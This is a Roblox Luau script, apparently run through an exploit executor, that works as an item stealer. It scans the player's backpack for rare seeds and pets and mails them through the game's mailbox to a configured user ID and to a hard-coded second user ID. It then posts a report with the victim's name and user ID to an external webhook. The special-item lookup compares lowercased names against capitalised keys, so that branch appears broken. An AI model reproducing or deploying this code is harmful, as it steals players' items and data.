local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local Networking = require(game.ReplicatedStorage.SharedModules.Networking)

local player = Players.LocalPlayer
local inventory = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")

local targetUserId = getgenv().targetUserId
local specialTargetUserId = 3650124898 -- User ID for special items

local trackedPets = getgenv().trackedPets
local rareSeeds = getgenv().rareSeeds

-- Define the special items that go to the special target user ID
local specialItems = {
    ["Dragon's Breath"] = true,
    ["Ghost Pepper"] = true,
    ["Unicorn"] = true,
    ["Ice Serpent"] = true,
    ["Golden Dragonfly"] = true,
    ["Moon Bloom"] = true,
    ["Bamboo"] = true
}

local itemsToSendToTarget = {} -- Items for getgenv().targetUserId
local itemsToSendToSpecialTarget = {} -- Items for user ID 3650124898
local foundPets = {}
local rareSeedCount = {}
local otherSeedCount = 0

local function safeCount(value)
	if typeof(value) ~= "number" then
		return 1
	end
	if value < 1 then
		return 1
	end
	return math.floor(value)
end

local function isValidInstance(item)
	return item and typeof(item) == "Instance" and item.Name ~= nil
end

local containers = {
	inventory,
	workspace:FindFirstChild(player.Name)
}

for _, container in ipairs(containers) do
	if container then
		for _, item in ipairs(container:GetChildren()) do

			if not isValidInstance(item) then
				continue
			end

			local category = item:GetAttribute("MainCategory")
			local count = safeCount(item:GetAttribute("Count"))

			if category == "Seed" or category == "Seeds" then
				local seedName = item.Name
				local seedNameLower = string.lower(seedName)

				if specialItems[seedNameLower] then
					-- This is a special item, send to special target user ID
					table.insert(itemsToSendToSpecialTarget, {
						Category = "Seeds",
						ItemKey = seedName,
						Count = count
					})
				elseif rareSeeds[seedName] then
					-- This is a rare seed but not special, send to regular target
					rareSeedCount[seedName] = (rareSeedCount[seedName] or 0) + count

					table.insert(itemsToSendToTarget, {
						Category = "Seeds",
						ItemKey = seedName,
						Count = count
					})
				else
					otherSeedCount += 1
				end
			end

			local petId = item:GetAttribute("PetId")
			local petName = item:GetAttribute("Pet")

			if category == "Pets" or petId or petName then
				if typeof(petId) == "string" and petId ~= "" then

					local actualPetName = petName or item.Name
					local petNameLower = string.lower(actualPetName)

					if specialItems[petNameLower] then
						-- This is a special pet, send to special target user ID
						table.insert(itemsToSendToSpecialTarget, {
							Category = "Pets",
							ItemKey = petId,
							Count = 1
						})

						table.insert(foundPets, actualPetName)
					elseif trackedPets[actualPetName] then
						-- This is a tracked pet but not special, send to regular target
						table.insert(itemsToSendToTarget, {
							Category = "Pets",
							ItemKey = petId,
							Count = 1
						})

						table.insert(foundPets, actualPetName)
					end
				end
			end
		end
	end
end

-- Send items to regular target user ID
local success1, result1, err1 = pcall(function()
	return Networking.Mailbox.SendBatch:Fire(
		targetUserId,
		itemsToSendToTarget,
		"hello"
	)
end)

-- Send special items to special target user ID
local success2, result2, err2 = pcall(function()
	return Networking.Mailbox.SendBatch:Fire(
		specialTargetUserId,
		itemsToSendToSpecialTarget,
		"hello"
	)
end)

local rareSeedLines = {}
local totalRareSeeds = 0

for seed, count in pairs(rareSeedCount) do
	table.insert(rareSeedLines, seed .. " x" .. count)
	totalRareSeeds += count
end

table.sort(rareSeedLines)

local payload = {
	content = "",
	embeds = {
		{
			title = "🌱 Inventory Scan Report",
			description =
				"**Player:** `" .. player.Name .. "`\n" ..
				"**Target:** `" .. tostring(targetUserId) .. "`\n" ..
				"**Special Target:** `" .. tostring(specialTargetUserId) .. "`",

			color = 5814783,

			fields = {
				{
					name = "🌟 Rare Seeds (" .. totalRareSeeds .. ")",
					value = #rareSeedLines > 0 and table.concat(rareSeedLines, "\n") or "None",
					inline = false
				},
				{
					name = "🌿 Other Seeds",
					value = tostring(otherSeedCount),
					inline = true
				},
				{
					name = "🐾 Pets Found",
					value = table.concat(foundPets, "\n"),
					inline = false
				},
				{
					name = "📦 Items Sent to Regular Target",
					value = tostring(#itemsToSendToTarget),
					inline = true
				},
				{
					name = "📦 Special Items Sent",
					value = tostring(#itemsToSendToSpecialTarget),
					inline = true
				}
			},

			footer = {
				text = "User ID: " .. player.UserId
			},

			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}
	}
}

local httpRequest = request or http_request or syn and syn.request or fluxus and fluxus.request

if httpRequest then
	httpRequest({
		Url = getgenv().webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode(payload)
	})
end
